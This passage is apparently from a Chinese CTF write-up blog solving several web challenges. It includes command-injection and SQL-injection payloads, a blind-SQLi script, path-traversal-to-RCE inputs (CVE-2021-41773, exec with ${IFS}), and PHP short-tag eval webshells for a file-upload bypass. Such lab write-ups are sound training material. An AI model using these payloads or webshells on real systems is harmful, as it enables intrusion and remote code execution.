    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/png;base64,<span class="hljs-subst">$data</span>'/&gt;"</span>;
}</code></pre>
<p>简单的命令执行，不过注意参数的传参即可：<code>?Ping[ip.exe=1 | cat /flag</code></p>
<h1 id="nssctf-2022-spring-recruitbabysql">[NSSCTF 2022 Spring Recruit]babysql</h1>
<pre><code class="hljs scss">hacker!!black_list is /if|and|\s|#|--/<span class="hljs-selector-tag">i</span></code></pre>
<p>过滤了空格和注释符，那/**/代替空格，单引号闭合后面的单引号即可</p>
<pre><code class="hljs scss">username=-<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span>(select/**/group_concat(flag)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>flag)'</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240311220803921.png" alt="image-20240311220803921"></p>
<p>由于输入上述payload，页面回显有flag字样。因此也可以盲注进行</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

strings = <span class="hljs-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\",#$&amp;'()*+-./:;&lt;=&gt;?@[\]^_`{|}~"</span>
pwd = <span class="hljs-string">''</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    flag = <span class="hljs-literal">True</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:
        data = {<span class="hljs-string">"username"</span>: <span class="hljs-string">f"tarnisha'/**/or/**/database()/**/like/**/'<span class="hljs-subst">{pwd+i}</span>%"</span>}
        response = requests.post(<span class="hljs-string">"http://node2.anna.nssctf.cn:28793/"</span>, data=data)
        time.sleep(<span class="hljs-number">0.1</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"flag"</span> <span class="hljs-keyword">in</span> response.text:
            pwd += i
            <span class="hljs-built_in">print</span>(pwd)
            flag = <span class="hljs-literal">False</span>
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">if</span> flag:
        <span class="hljs-keyword">break</span></code></pre>
<h1 id="gfctf-2021baby_web">[GFCTF 2021]Baby_Web</h1>
<p>这里也是遗忘这个知识点了，不知道如何进行目录穿越：</p>
<p>利用漏洞为：CVE-2021-41773\CVE-2021-42013，具体可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/131710556?spm=1001.2014.3001.5501">CVE-2021-41773 漏洞复现</a></p>
<p>这里我的dirsearch也扫出来过这个漏洞，但我直接在URL上发送就不可，必须用bp（不理解）</p>
<p>这里提醒着我，在扫目录的时候出现了cgi-bin就应该联想到目录穿越</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312173603813.png" alt="image-20240312173603813"></p>
<p>验证成功，接下来就是读取源码了，他提示源码在上层目录的xxx.php.txt，猜测xxx为index</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312174103182.png" alt="image-20240312174103182"></p>
<pre><code class="hljs php">&lt;h1&gt;Welcome To GFCTF <span class="hljs-number">12</span>th!!&lt;/h1&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">"main"</span>,<span class="hljs-string">"main"</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"Class.php"</span>;
<span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Temp</span>(<span class="hljs-variable">$_POST</span>);
<span class="hljs-variable">$temp</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>]);

<span class="hljs-meta">?&gt;</span>
&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;</code></pre>
<p>读取Class.php，刚开始只输入Class.php竟然读取不到，联想之前，我尝试添加txt成功了</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">'main'</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"no!!"</span>);
Class Temp{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$date</span>=[<span class="hljs-string">'version'</span>=&gt;<span class="hljs-string">'1.0'</span>,<span class="hljs-string">'img'</span>=&gt;<span class="hljs-string">'https://www.apache.org/img/asf-estd-1999-logo.jpg'</span>];
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$template</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>{

        <span class="hljs-variable language_">$this</span>-&gt;date = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;date,<span class="hljs-variable">$data</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">'admin'</span>){
            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'..'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'./template/admin/'</span>.<span class="hljs-variable">$template</span>);
            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;template)){
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"no!!"</span>);
            }
        }
        <span class="hljs-keyword">else</span>{
            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-string">'./template/index.html'</span>;
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>=<span class="hljs-string">''</span></span>)</span>{

        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$this</span>-&gt;date);<span class="hljs-comment">//将键值当做变量，值当做变量的值</span>
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getTempName</span>(<span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>);
        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;template);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listdata</span>(<span class="hljs-params"><span class="hljs-variable">$_params</span></span>)</span>{
        <span class="hljs-variable">$system</span> = [
            <span class="hljs-string">'db'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'app'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'num'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'sum'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'form'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'page'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'site'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'flag'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'not_flag'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'show_flag'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'more'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'catid'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'field'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'order'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'space'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'table'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'table_site'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'total'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'join'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'on'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'action'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'return'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'sbpage'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'module'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'urlrule'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'pagesize'</span> =&gt; <span class="hljs-string">''</span>,
            <span class="hljs-string">'pagefile'</span> =&gt; <span class="hljs-string">''</span>,
        ];

        <span class="hljs-variable">$param</span> = <span class="hljs-variable">$where</span> = [];

        <span class="hljs-variable">$_params</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_params</span>); <span class="hljs-comment">//主要去除字符串收尾空格符</span>

        <span class="hljs-variable">$params</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">' '</span>, <span class="hljs-variable">$_params</span>); <span class="hljs-comment">//按照空格将字符串分割为数组</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>], [<span class="hljs-string">'list'</span>,<span class="hljs-string">'function'</span>])) { <span class="hljs-comment">//看数组是否存在后面数组的指定值</span>
            <span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">'action='</span>.<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>];
        }
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$t</span>) {
            <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">'='</span>));<span class="hljs-comment">//找寻=符号第一次出现的位置：0-》位置</span>
            <span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">'='</span>) + <span class="hljs-number">1</span>);<span class="hljs-comment">//位置+1以后得（不包括位置+1）</span>
            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$var</span>) {<span class="hljs-comment">//action=action=function  //var=action，val=function</span>
                <span class="hljs-keyword">continue</span>;
            }
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>])) { 
                <span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;<span class="hljs-comment">//action=》function；</span>
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$param</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>; <span class="hljs-comment">//action=》function</span>
            }
        }
        <span class="hljs-comment">// action</span>
        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">'action'</span>]) {

            <span class="hljs-keyword">case</span> <span class="hljs-string">'function'</span>:

                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">'name'</span>])) { <span class="hljs-comment">//name键值的值必须存在且为已经定义的函数</span>
                    <span class="hljs-keyword">return</span>  <span class="hljs-string">'hacker!!'</span>;
                } <span class="hljs-keyword">elseif</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">'name'</span>])) {
                    <span class="hljs-keyword">return</span> <span class="hljs-string">'hacker!!'</span>;
                }

                <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">'force'</span>];
                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) {
                    <span class="hljs-variable">$p</span> = [];
                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) {
                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$var</span>, <span class="hljs-string">'param'</span>) === <span class="hljs-number">0</span>) {<span class="hljs-comment">//返回param在var中首次出现的位置</span>
                            <span class="hljs-variable">$n</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));
                            <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;
                        }
                    }
                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) {

                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">'name'</span>], <span class="hljs-variable">$p</span>);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">'name'</span>]);
                    }
                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;
                }<span class="hljs-keyword">else</span>{
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
                }
            <span class="hljs-keyword">case</span> <span class="hljs-string">'list'</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;date);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}</code></pre>
<p>另外还有/template/admin/下的部分源码：</p>
<pre><code class="hljs scss">&lt;!--&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>="&lt;?php echo <span class="hljs-variable">$img</span>;?&gt;"&gt;--&gt;
&lt;<span class="hljs-selector-tag">div</span>&gt;&lt;?php echo <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">listdata</span>("action=list module=$mod");?&gt;&lt;<span class="hljs-selector-tag">div</span>&gt;<span class="hljs-comment">//module=action=function</span>
    &lt;<span class="hljs-selector-tag">h6</span>&gt;version: &lt;?php echo <span class="hljs-variable">$version</span>;?&gt;&lt;/<span class="hljs-selector-tag">h6</span>&gt;</code></pre>
<p>action=list、module=$mod</p>
<p>这道题代码审计审的我很累（因为太菜），最后还是陷入了一个小误区，还是无奈看了wp：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/131716989?spm=1001.2014.3001.5501">[GFCTF 2021]Baby_Web(CVE-2021-41773) 从一道题入门PHP代码审计</a>–很详细</p>
<p>这里我审计的时候，思路都理顺了，就是最终传payload陷入误区了。</p>
<p>总的来说，就是需要在filename传值中，要使其合理化，使得/template/admin/filename为一个合法文件</p>
<p>当然这里尝试几次就知道index.html即可</p>
<p>随后我们就能将上述<code>$this-&gt;listdata("action=list module=$mod")</code>所在文件包含进去，而包含进去的目的就是为了调用最终的<code>call_user_func_array</code>或<code>call_user_func</code>函数，最终RCE</p>
<p>而其中我在传参数的时候，我以为param数组中的action=function的action是个键值，所以弄得我始终没成功，看了wp思考了一会儿发现应该会有数字索引的，也就是比如：0=》“action=function”这样理解的话，那<code>system['action']=function</code>就成立了。具体不再详述，上述文章很详细。</p>
<p>这里需要注意最终的命令执行函数还被禁了很多，但是无回显函数exec没禁用，那直接将输出重定向读取即可，当然还需要注意这里的空格（用合理字符代替）</p>
<pre><code class="hljs scss">space=admin&amp;mod=hybcx action=function name=exec param0a=cat${IFS}/f11111111aaaagggg&gt;/<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span>/<span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312191657763.png" alt="image-20240312191657763"></p>
<p>这里看了wp还有方法二，当时分析也没想着利用<code>call_user_func</code>函数，因为那里只有一个参数，我没深度思考是否能利用，但这里看了wp发现，直接传入phpinfo函数（这个函数不需要参数）而flag也恰好在其中</p>
<pre><code class="hljs scss">space=admin&amp;mod=hybcx action=function name=phpinfo</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312192658066.png" alt="image-20240312192658066"></p>
<h1 id="swpuctf-2023-秋季新生赛一键连接">[SWPUCTF 2023 秋季新生赛]一键连接!</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-variable">$md5_1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'md5_1'</span>];
<span class="hljs-variable">$md5_2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'md5_2'</span>];
<span class="hljs-variable">$sha1_1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'sha1_1'</span>];
<span class="hljs-variable">$sha1_2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'sha1_2'</span>];
<span class="hljs-variable">$new_player</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'new_player'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5_1</span> !== <span class="hljs-variable">$md5_2</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5_1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5_2</span>)) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sha1_1</span> != <span class="hljs-variable">$sha1_2</span> &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$sha1_1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$sha1_2</span>)) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$new_player</span>) === <span class="hljs-string">"Welcome to NSSCTF!!!"</span>) {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Congratulations~~~~~~~~~"</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"试试need Antsword&lt;br/&gt;"</span>;
            @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'Nss'</span>]);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"可曾听过data协议?"</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"sha1又如何相等呢"</span>;
    }
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"如何让md5值相等呢¿"</span>;
}
如何让md5值相等呢¿</code></pre>
<p>思路很简单，数组绕过，伪协议绕过file_get_contents，最后webshell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312193713044.png" alt="image-20240312193713044"></p>
<h1 id="swpuctf-2022-新生赛file_master">[SWPUCTF 2022 新生赛]file_master</h1>
<p>这题某个知识点也是第一次见</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312211623343.png" alt="image-20240312211623343"></p>
<p>来到首页，这里我对查看文件功能没做尝试，后面看wp发现这个可以用来查看源码进一步分析，直接抓包输入index.php即可，这里我直接放上源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-title function_ invoke__">session_start</span>();
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){
        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>]);
    }
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>])){
        <span class="hljs-variable">$whtie_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"image/jpeg"</span>);
        <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"type"</span>];
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$filetype</span>,<span class="hljs-variable">$whtie_list</span>)){
            <span class="hljs-variable">$img_info</span> = @<span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>]);
            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$img_info</span>){
                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$img_info</span>[<span class="hljs-number">0</span>]&lt;=<span class="hljs-number">20</span> &amp;&amp; <span class="hljs-variable">$img_info</span>[<span class="hljs-number">1</span>]&lt;=<span class="hljs-number">20</span>){
                    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">"upload/"</span>.<span class="hljs-title function_ invoke__">session_id</span>())){
                        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">"upload/"</span>.<span class="hljs-title function_ invoke__">session_id</span>());
                    }
                    <span class="hljs-variable">$save_path</span> = <span class="hljs-string">"upload/"</span>.<span class="hljs-title function_ invoke__">session_id</span>().<span class="hljs-string">"/"</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>];
                    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>],<span class="hljs-variable">$save_path</span>);
                    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$save_path</span>);
                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/php/i"</span>,<span class="hljs-variable">$content</span>)){
                        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">5</span>);
                        @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$save_path</span>);
                        <span class="hljs-keyword">die</span>(<span class="hljs-string">"hacker!!!"</span>);
                    }<span class="hljs-keyword">else</span>{
                        <span class="hljs-keyword">echo</span> <span class="hljs-string">"upload success!! upload/your_sessionid/your_filename"</span>;
                    }
                }<span class="hljs-keyword">else</span>{
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">"image hight and width must less than 20"</span>);
                }
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"invalid file head"</span>);
            }
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"invalid file type!image/jpeg only!!"</span>);
        }
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="data:jpg;base64,'</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"welcome.jpg"</span>)).<span class="hljs-string">'"&gt;'</span>;
    }
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里不分析了，我黑盒做，当时上传，首先没限制后缀，然后是mime类型只能为jpeg，后面修改完之后，说文件头无效，这里用了几个似乎只有GIF89a才行。</p>
<p>随后又出来说图片的高度与宽度必须小于20，这里就蒙了，不知道如何限制，网上找了半天，还以为用工具来修改，看了wp发现代码即可。。。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312194518200.png" alt="image-20240312194518200"></p>
<p>如下图，直接宏定义完美解决</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312211035922.png" alt="image-20240312211035922"></p>
<p>这里由于还会检测文件内容是否含有php字符，因此需要短标签绕过，这里借用人家的总结了</p>
<h2 id="php短标签绕过">php短标签绕过</h2>
<p>php中最常见的标签为<!--?php ?--></p>
<p>不过在题目上传时可能会被waf过滤掉php关键字。根据查询结果，还有四种php的标签，分别是：</p>
<blockquote>
<p>①<!--? ?--> 仅在配置short_open_tag=on时可以使用，适合执行php语句；</p>
<p>②<!--?= ?-->即使配置short_open_tag=off时依然可以使用，相当于<!--?php echo ?-->，适合输出php语句~</p>
</blockquote>
<p>上述二者的短标签都不必闭合（即?&gt;可以省略不写，也可以连接成功</p>
<pre><code class="hljs scss">&lt;?  <span class="hljs-keyword">@eval</span>($_POST[<span class="hljs-string">'a'</span>]);?&gt;

&lt;?= <span class="hljs-keyword">@eval</span>($_POST[<span class="hljs-string">'a'</span>]);?&gt;

&lt;?  <span class="hljs-keyword">@eval</span>($_POST[<span class="hljs-string">'a'</span>]);

&lt;?= <span class="hljs-keyword">@eval</span>($_POST[<span class="hljs-string">'a'</span>]);</code></pre>
<p>但这里不知为何，似乎必须用有=符号的（因为配置问题）。上传之后，常规找flag即可</p>
